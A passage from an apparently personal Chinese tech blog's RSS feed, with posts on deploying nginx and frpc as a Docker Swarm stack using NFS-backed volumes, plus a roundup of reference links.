  replicated          1/1                 grafana/grafana:latest       *:3000-&gt;3000/tcp</span><br><span class="line">78f3ryphvjc6        monitor_influx      replicated          1/1                 influxdb:latest</span><br></pre></td></tr></table></figure><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>Docker 的项目和工程至此就结束了，后面开始 Golang 的学习了，加油呢。</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/17/OP_Cluster_Monitor/#disqus_thread</comments>
    </item>
    
    <item>
      <title>从Service到Stack</title>
      <link>https://www.diglp.xyz/2019/03/14/OP_Swarm_Stack/</link>
      <guid>https://www.diglp.xyz/2019/03/14/OP_Swarm_Stack/</guid>
      <pubDate>Wed, 13 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;本来想着集群稳定呢，结果早上六点docker 的网络就突然挂了。默认网关除了问题，ping
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>本来想着集群稳定呢，结果早上六点docker 的网络就突然挂了。默认网关除了问题，ping 外网不可达。导致远程主机域名无法解析，<code>8.8.4.4:53</code> 不可达，整体服务不可用。</p><p>这篇，接着上面的内容，实现 frp 和 Nignx 的服务的Stack 化。前面遇到的问题，后面在找个整体的时间进行解决吧。</p><h2 id="架构描述-以及-Compose实现"><a href="#架构描述-以及-Compose实现" class="headerlink" title="架构描述 以及 Compose实现"></a>架构描述 以及 Compose实现</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>这里主要是使用 frp 和 Nginx ，前者用于穿透，后者进行页面的反代。所以这里的就是两层的服务。应该还有一级提供负载均衡的server，不过Swarm 的本身已经提供了 VIP 以及负载均衡的功能。 </p><h3 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker-Compose"></a>Docker-Compose</h3><p>docker-compose 是用来做docker 的多容器控制，可以通过一个描述文件，来对服务，或者容器，进行整体的搭建，大大简化了操作流程以及可维护和可拓展性。这里的内容参考了网上的例子，进行了简单的修改。实现了前面所描述的架构。</p><p>具体的 <code>.yml</code> 文件如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">"3.2"</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr">  nginx:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">nginx</span></span><br><span class="line"><span class="attr">    ports:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">"80"</span><span class="comment"># 对外暴露端口</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">      - nginx_conf:</span><span class="string">/etc/nginx</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">      update_config:</span></span><br><span class="line"><span class="attr">        parallelism:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">        delay:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">      restart_policy:</span></span><br><span class="line"><span class="attr">        condition:</span> <span class="string">on-failure</span></span><br><span class="line">  </span><br><span class="line"><span class="attr">  frp:</span></span><br><span class="line"><span class="attr">    image:</span> <span class="string">xddxdd/frpc:arm32v7</span></span><br><span class="line"><span class="attr">    networks:</span></span><br><span class="line"><span class="bullet">      -</span> <span class="string">backend</span></span><br><span class="line"><span class="attr">    volumes:</span></span><br><span class="line"><span class="attr">     - frpc_ini:</span><span class="string">/frp</span></span><br><span class="line"><span class="attr">    deploy:</span></span><br><span class="line"><span class="attr">      replicas:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">      update_config:</span></span><br><span class="line"><span class="attr">        parallelism:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">        delay:</span> <span class="number">10</span><span class="string">s</span></span><br><span class="line"><span class="attr">      restart_policy:</span></span><br><span class="line"><span class="attr">        condition:</span> <span class="string">on-failure</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line"><span class="attr">  backend:</span></span><br><span class="line"><span class="comment"># 这里是应该建立的卷</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line"><span class="attr">  nginx_conf:</span> </span><br><span class="line"><span class="attr">    driver_opts:</span></span><br><span class="line"><span class="attr">      type:</span> <span class="string">"nfs4"</span></span><br><span class="line"><span class="attr">      o:</span> <span class="string">"addr=192.168.1.130,nolock,soft,rw"</span></span><br><span class="line"><span class="attr">      device:</span> <span class="string">":/srv/nfs/nginx/conf"</span></span><br><span class="line"><span class="attr">  frpc_ini:</span> </span><br><span class="line"><span class="attr">    driver_opts:</span>  </span><br><span class="line"><span class="attr">      type:</span> <span class="string">"nfs4"</span></span><br><span class="line"><span class="attr">      o:</span> <span class="string">"addr=192.168.1.130,nolock,soft,rw"</span></span><br><span class="line"><span class="attr">      device:</span> <span class="string">":/srv/nfs/frpc"</span></span><br></pre></td></tr></table></figure><p>一个好消息：在这种配置的情况下比较奇迹的是可以进行 <strong>NFS 的自动挂载</strong>了。解决了前面一个很大的问题。也不清楚是之前的BUG 还是什么情况。</p><blockquote><p>Compose下面使用nfs : <span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDUyODI2MDgvaG93LXRvLWRpcmVjdGx5LW1vdW50LW5mcy1zaGFyZS12b2x1bWUtaW4tY29udGFpbmVyLXVzaW5nLWRvY2tlci1jb21wb3NlLXYz" title="https://stackoverflow.com/questions/45282608/how-to-directly-mount-nfs-share-volume-in-container-using-docker-compose-v3">How to directly mount NFS share/volume in container using docker compose v3<i class="fa fa-external-link"></i></span></p></blockquote><hr><p>这里<strong>有一个坑</strong>。在Portainer 上面直接进行 Stack 部署的话，会有报错，说是平台不支持，但是的确是拉的arm的。报错信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">State Messagepending task scheduling</span><br><span class="line">Error messageno suitable node (unsupported platform on 3 nodes; 1 node not available for new tasks)</span><br></pre></td></tr></table></figure><p>查证之后，得到以下的回答</p><blockquote><p>参考链接 =  <span class="exturl" data-url="aHR0cHM6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvNDg5NjIzOTkvbm8tc3VpdGFibGUtbm9kZS11bmFibGUtdG8tZGVwbG95LWltYWdlLXVzaW5nLWRvY2tlci1zZXJ2aWNl" title="https://stackoverflow.com/questions/48962399/no-suitable-node-unable-to-deploy-image-using-docker-service">no suitable node - unable to deploy image using docker service<i class="fa fa-external-link"></i></span></p></blockquote><p>在命令行里进行创建，带一个 <code>--resolve-image never</code> 的参数，这样可以解决报错：<strong>镜像平台不支持的问题</strong> 但前提是，镜像的架构必须相同。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stack deploy --compose-file str.yml --resolve-image never home</span><br></pre></td></tr></table></figure><p>这里有一个 Issue ,在进行 nfs 的挂载部分,可能会出现  ,<code>chmod</code> 的permission deny,试着以下命令。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /srv/nfs -R</span><br></pre></td></tr></table></figure><h2 id="项目细节"><a href="#项目细节" class="headerlink" title="项目细节"></a>项目细节</h2><p>这里需要解决的问题，就是网络的问题。在前面的方法里面是直接把端口暴露在了 HOST 上面，这样占用主机资源显然是不符合<strong>容器化的思想</strong>。这里就使用Docker 的强大的网络功能，来实现一个真正的服务。swarm 的服务网络其自动带有了 负载均衡 以及 <strong>VIP</strong>。所以，这里实现目标就是 FRP 到 VIP的映射</p><h3 id="Stack的内部网络"><a href="#Stack的内部网络" class="headerlink" title="Stack的内部网络"></a>Stack的内部网络</h3><p>Swarm 的自建 Layout 网络默认的是VIP模式，可以inspect服务得到服务所在网络的VIP。这个服务，跑了 Nginx 镜像的多个副本。这些副本共用一个 VIP。实现了负载均衡以及高可用，当单容器挂了之后，自动的进行 IP 的漂移。</p><p>获取 service 的VIP 如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">docker service  inspect nginxs</span><br><span class="line"></span><br><span class="line">"Endpoint": &#123;</span><br><span class="line">"Spec": &#123;</span><br><span class="line">"Mode": "vip"</span><br><span class="line">&#125;,</span><br><span class="line">"VirtualIPs": [</span><br><span class="line">        &#123;</span><br><span class="line">            "NetworkID": "ktsw8uaob2n0ppsh93p5upils",</span><br><span class="line">            "Addr": "10.0.14.9/24"</span><br><span class="line">        &#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于前面已经配置了，这个 Stack ，两个服务是在同一个子网（backend）中。所以 ，frp服务是和nginx 的网络是联通的。所以可以直接访问 其VIP。由于，好像使用stack了NFS 的问题自动解决了。这里直接修改主机上的配置文件即可。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@bgb0:/tmp# cat /srv/nfs/frpc/frpc.ini </span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = ****.****.xyz </span><br><span class="line"><span class="attr">server_port</span> = ****</span><br><span class="line"><span class="attr">token</span> = myfrptest</span><br><span class="line"><span class="section">[web_swarm]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">10.0</span>.<span class="number">14.9</span># 这里是 Nginx服务的VIP</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ****</span><br></pre></td></tr></table></figure><p>之后，更新该服务，重新加载配置。发现外网服务可达，已实现目标功能。开心</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC82MGJjY2JkYjZhZjk=" title="https://www.jianshu.com/p/60bccbdb6af9">Docker Swarm 入门：Service Network 管理<i class="fa fa-external-link"></i></span> 通过这篇，对网络有了基本了解 （小姐姐好看）</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9kYmE5MzQyMDcxZDg=" title="https://www.jianshu.com/p/dba9342071d8">Docker Swarm 服务发现和负载均衡原理<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5odWlsb2cuY29tLz9wPTEwMzg=" title="http://www.huilog.com/?p=1038">docker swarm 集群及多主机overlay网络测试<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLjUxY3RvLmNvbS9nYW5iaW5nLzIwOTEyOTI=" title="https://blog.51cto.com/ganbing/2091292">“三剑客”之Swarm应用数据持久化管理（volume 、bind 、 nfs）<i class="fa fa-external-link"></i></span></li></ul></blockquote><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>构思基本已经实现了，一个基于容器技术的服务部署。后面，想着对系统的整体的日志监控，依旧使用前面的ELK。完成之后，算是项目收工，后面开始Golang了</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/14/OP_Swarm_Stack/#disqus_thread</comments>
    </item>
    
    <item>
      <title>收工-关于Swarm的总结</title>
      <link>https://www.diglp.xyz/2019/03/14/OP_Swarm_Sumup/</link>
      <guid>https://www.diglp.xyz/2019/03/14/OP_Swarm_Sumup/</guid>
      <pubDate>Wed, 13 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;这篇算是这段时间的对 Docker
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>这篇算是这段时间的对 Docker 的集群项目的一个总结，想写点什么不过发现前面都零零星星写的差不多了，所以这篇就水水的把期间遇到的有指导性的文章进行一次收集吧。</p><blockquote><p>发现了没，浏览器的标签不是收敛的。</p></blockquote><h2 id="Links"><a href="#Links" class="headerlink" title="Links"></a>Links</h2><p>这里收集了一些优秀且有参考意义的文章，总是舍不得关掉的那种。</p><blockquote><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vZnVuZGVidWcvcC82ODIzODk3Lmh0bWw=" title="https://www.cnblogs.com/fundebug/p/6823897.html">生产环境中使用Docker Swarm的一些建议 – Fundebug博客 <i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS9wLzY4NzAzNTkuaHRtbA==" title="https://www.cnblogs.com/kevingrace/p/6870359.html">Docker管理工具-Swarm部署记录<i class="fa fa-external-link"></i></span> 很棒的一個博客站，長期學習</li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGJldGEubWUvZG9ja2VyLXZvbHVtZS1taWdyYXRlLw==" title="https://www.pbeta.me/docker-volume-migrate/">Docker volume 跨服务器迁移 – way to go<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGJldGEubWUva2lsbC14bXJpZy8=" title="https://www.pbeta.me/kill-xmrig/">服务器清除 xmrig 后门程序记录 – way to go<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucGJldGEubWUvZG9ja2VyLWxubXAv" title="https://www.pbeta.me/docker-lnmp/">Docker 搭建 Nginx+MySQL+ PHP (LNMP)基础环境 – way to go<i class="fa fa-external-link"></i></span> 很棒的文章，干货实用。</li><li><span class="exturl" data-url="aHR0cDovL3d3dy5haWRhbnN1LmNvbS8yMDE3L2RvY2tlci1jb250YWluZXJzLXNlcnZpY2VzLw==" title="http://www.aidansu.com/2017/docker-containers-services/">Docker 镜像、容器与服务<i class="fa fa-external-link"></i></span> 一個實例，簡潔明瞭的構建自己的一個鏡像</li></ul><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9va3N0YWNrLmNuL2Jvb2tzL2RvY2tlci1zd2FybS1ndWlkZXM=" title="https://www.bookstack.cn/books/docker-swarm-guides">Docker Swarm 深入浅出<i class="fa fa-external-link"></i></span>  很好的一本書</li><li><span class="exturl" data-url="aHR0cHM6Ly95ZWFzeS5naXRib29rcy5pby9kb2NrZXJfcHJhY3RpY2Uv" title="https://yeasy.gitbooks.io/docker_practice/">Docker — 从入门到实践<i class="fa fa-external-link"></i></span> </li></ul><ul><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1hbGx1eC5tZS8yMDE3LzAzLzE5L2NvbnN1bC8=" title="https://blog.mallux.me/2017/03/19/consul/">Consul 与 Registrator <i class="fa fa-external-link"></i></span>怕自己弄丢的好文章</li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1hbGx1eC5tZS8yMDE3LzAzLzExL21mcy8=" title="https://blog.mallux.me/2017/03/11/mfs/">02 - Moosefs 分布式文件系统<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm1hbGx1eC5tZS8yMDE3LzAyLzIyL3RyYWVmaWsv" title="https://blog.mallux.me/2017/02/22/traefik/">Traefik 微服务代理<i class="fa fa-external-link"></i></span></li></ul></blockquote>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/14/OP_Swarm_Sumup/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Nginx 的 Swarm 化</title>
      <link>https://www.diglp.xyz/2019/03/13/OP_Swarm_nginx/</link>
      <guid>https://www.diglp.xyz/2019/03/13/OP_Swarm_nginx/</guid>
      <pubDate>Tue, 12 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这个题目可能显得比较不严谨，但是也想不到什么好的名字。这篇主要就是实现，在一个 Swarm 集群里面的 Nginx
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这个题目可能显得比较不严谨，但是也想不到什么好的名字。这篇主要就是实现，在一个 Swarm 集群里面的 Nginx 的服务部署。且实现可以很快的进行 文件变更以及配置变更的统一提交。</p><p>这里至于之前的对于Swarm 的服务功能的测试不同了，更加偏向应用。再往后一部分，<strong>将会使用stack</strong> 来实现一个真正可用的服务架构。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>使用Swarm 很容易的实现了一个服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker service create \</span><br><span class="line">--replicas 2 \# 两个副本（一共）</span><br><span class="line">--network ngx_net \ # 虚拟网络</span><br><span class="line">--name my-test \# 服务名</span><br><span class="line">-p 80:80 nginx# 端口映射（本地到容器）</span><br></pre></td></tr></table></figure><p>但是实际上要对这些服务进行以下内容的变更，就需要挂载<strong>外部卷</strong>了。</p><h3 id="外部卷的挂载"><a href="#外部卷的挂载" class="headerlink" title="外部卷的挂载"></a>外部卷的挂载</h3><p>在创建服务的时候，可以使用以下，命令进行 一个数据卷的创建，以及挂载。而且在服务被创建的时候，这些容器会被拷贝到多个节点上去，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个挂载卷</span><br><span class="line">docker volume create --name myvolume</span><br><span class="line"># 在容器内挂载卷</span><br><span class="line">docker service create \</span><br><span class="line">--replicas 2 \</span><br><span class="line">--network ngx_net \</span><br><span class="line">--mount type=volume,src=myvolume,dst=/wangshibo \</span><br><span class="line">--name test-nginx nginx</span><br></pre></td></tr></table></figure><p>但是问题来了，如果部署完成之后，对配置文件进行变更，这文件并不会同步到每个节点上。这里打算使用 NFS 进行部署</p><h3 id="NFS-的部署"><a href="#NFS-的部署" class="headerlink" title="NFS 的部署"></a>NFS 的部署</h3><p>为了实现多节点的配置文件的同步，以及数据卷的统一管理，这里就直接使用NFS</p><p>使用 apt 直接进行服务的安装 ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common # 这个在所有节点进行安装</span><br><span class="line">apt-get install nfs-kernel-server# 这里是NFS的服务，安装在服务节点上</span><br></pre></td></tr></table></figure><p>配置共享目录 <code>/etc/exports</code> ，添加新行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/srv/nfs/  bgb1(rw,sync)  bgb2(rw,sync)  bgb3(rw,sync)</span><br></pre></td></tr></table></figure><p>重启服务端的nfs服务，并且尝试挂载：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash"> service nfs-kernel-server start</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> b 主机上进行挂载</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> mount bgb0:/srv/nfs /mnt/</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash"> chmod a+x /srv/nfs -R</span></span><br></pre></td></tr></table></figure><hr><p>测试完成，NFS 部署完成。</p><h3 id="NFS-共享卷挂载"><a href="#NFS-共享卷挂载" class="headerlink" title="NFS 共享卷挂载"></a>NFS 共享卷挂载</h3><p>为了实现多个节点之间的文件共享。<strong>这里遇到了很坑的问题，不知道是自己的理解问题还是BUG什么，具体症状是 NFS卷 不进行自动的挂载</strong>。</p><p>新建一个NFS的卷，下面命令进行参数修改即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker volume create --driver local \</span><br><span class="line">--opt type=nfs4 \</span><br><span class="line">--opt o=addr=&lt;NFS-Server&gt;,rw \</span><br><span class="line">--opt device=:&lt;Shared-Path&gt; \</span><br><span class="line">share</span><br></pre></td></tr></table></figure><hr><p>由于上面的问题折腾了很久的时间，只好暂时使用手动进行挂载，后面再进行逐步的研究。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mount bgb0:/srv/nfs /var/lib/docker/volumes/share/_data</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用作页面 /usr/share/nginx/html/</span></span><br><span class="line">mount bgb0:/srv/nfs/nginx/html /var/lib/docker/volumes/Nginx_html/_data</span><br><span class="line"><span class="meta">#</span><span class="bash"> 用作配置 /etc/nginx/</span></span><br><span class="line">mount bgb0:/srv/nfs/nginx/conf /var/lib/docker/volumes/Nginx_conf/_data</span><br></pre></td></tr></table></figure><p>和第一部分的创建服务一样，这里直接使用Portainer来进行创建各个节点的卷，<strong>然后手动执行上面的命令，进行NFS的挂载，没有美感</strong></p><p>（应该又是一个 BUG ，在创建服务的时候初始配置，如果直接使用了当前的卷，其默认的的是新建新的卷。而不是对原有的卷来进行拷贝，这点待会可能去提个 Issue 。）<strong>需要在服务创建之后，后面进行第二次的挂载，才能正确的挂载 nginx_html 这个卷</strong></p><p>当全部进行手动挂载之后，所有的配置文件都可可以从NFS主机处获取。实现配置的统一管理</p><hr><p>记得映射 <strong>80 和 443</strong> 完成主机功能配置。</p><h3 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h3><p>当前面的基于 NFS 的共享配置完成之后，可以直接对之前的配置进行平行迁移即可，（copy-paste）。</p><p>完成配置文件的迁移之后，可以直接在终端里面进行平滑升级。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker service update WebTest</span><br></pre></td></tr></table></figure><h3 id="frpc-的部署"><a href="#frpc-的部署" class="headerlink" title="frpc 的部署"></a>frpc 的部署</h3><p>这里这里可以直接在 DockerHub上面找到相应的镜像，前面还以为没有，打算自己写 Dockerfile的，现在既然遇上了就直接使用了。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9yL3hkZHhkZC9mcnBjL3RhZ3M=" title="https://hub.docker.com/r/xddxdd/frpc/tags">xddxdd/frpc<i class="fa fa-external-link"></i></span> 这个是 frpc 的image ，里面刚好有 armv7 的版本 。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">entry point/usr/bin/frpc</span><br><span class="line">working Dir/frp</span><br></pre></td></tr></table></figure><p>这里，直接 bind 绑定 host 的目录，到容器内部</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--mount type=bind,src=/conf,dst=/frp</span><br></pre></td></tr></table></figure><p>主机目录配置文件 <code>frpc.ini</code> ，其配内容如下</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = *******</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = *******</span><br><span class="line"></span><br><span class="line"><span class="section">[web_swarm]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">192.168</span>.***.***</span><br><span class="line"><span class="attr">local_port</span> = <span class="number">443</span></span><br><span class="line"><span class="attr">remote_port</span> = ******</span><br></pre></td></tr></table></figure><p>之后直接对容器进行重启即可。</p><h3 id="后"><a href="#后" class="headerlink" title="后"></a>后</h3><p>这里是在云服务器上使用 Nginx 做一个 upstream ， 具体的细节前面有讲 不在赘述。至此功能测试完毕。</p><h2 id="续"><a href="#续" class="headerlink" title="续"></a>续</h2><p>后面将会使用 Stack 和 network 功能， 实现结构的整体部署。还得解决 NFS 的不自动挂载的问题</p><blockquote><p>是不是每个人年轻的时候都有这样一段日子，鸿鹄志高却难遂，迷茫地过着，昏昏噩噩地耗，最终不是妥协泯然众人，就是找不到出口被生活围困。这时候家人朋友，看在眼里，哪怕不说，心里想的也是“小镇青年何必心怀远方”这样的想法吧。（J·M·库切《青春》）</p></blockquote><p>### </p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2019/03/13/OP_Swarm_nginx/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Swarm的服务</title>
      <link>https://www.diglp.xyz/2019/03/12/OP_Swarm_%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8/</link>
      <guid>https://www.diglp.xyz/2019/03/12/OP_Swarm_%E9%9B%86%E7%BE%A4%E4%BD%BF%E7%94%A8/</guid>
      <pubDate>Mon, 11 Mar 2019 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前面的话&quot;&gt;&lt;a href=&quot;#前面的话&quot; class=&quot;headerlink&quot; title=&quot;前面的话&quot;&gt;&lt;/a&gt;前面的话&lt;/h2&gt;&lt;p&gt;上一篇简单快速的进行swarm集群的部署，这可以开始使用了。这里试着部署一个 Nginx
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前面的话"><a href="#前面的话" class="headerlink" title="前面的话"></a>前面的话</h2><p>上一篇简单快速的进行swarm集群的部署，这可以开始使用了。这里试着部署一个 Nginx 的服务，并且一步步实现前面的高可用的服务架构。</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9odWIuZG9ja2VyLmNvbS9fL25naW54" title="https://hub.docker.com/_/nginx">Nginx image 地址<i class="fa fa-external-link"></i></span></p></blockquote><p>这里推荐一个博客：</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20va2V2aW5ncmFjZS8=" title="https://www.cnblogs.com/kevingrace/">散尽浮华 - 安寻安放，不卑不亢；重剑无锋，大巧不工！<i class="fa fa-external-link"></i></span></p></blockquote><p>里面很多很多的干活，实用型的文章</p><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ul><li><p>多个容器的统一为服务</p></li><li><p>多个服务的统一为栈</p></li><li><p>服务内自动有VIP机制，VIP 为各个节点的IP</p></li><li><blockquote><p>docker service其实不仅仅是批量启动服务这么简单，而是在集群中定义了一种状态。Cluster会持续检测服务的健康状态并维护集群的高可用性。</p></blockquote></li></ul><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p>Swarm 作为 Docker 的原生功能，其主要的工具有以下：</p><ul><li>docker swarm 用于集群管理</li><li>docker service 用于服务创建</li><li>docker node 用于节点管理</li></ul><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><h3 id="部署服务"><a href="#部署服务" class="headerlink" title="部署服务"></a>部署服务</h3><p>这里简单的基于 Swarm 部署一个 Nginx 的服务。（其实这里本来应该有详细的说明的，留在下篇吧）</p><figure class="highlight 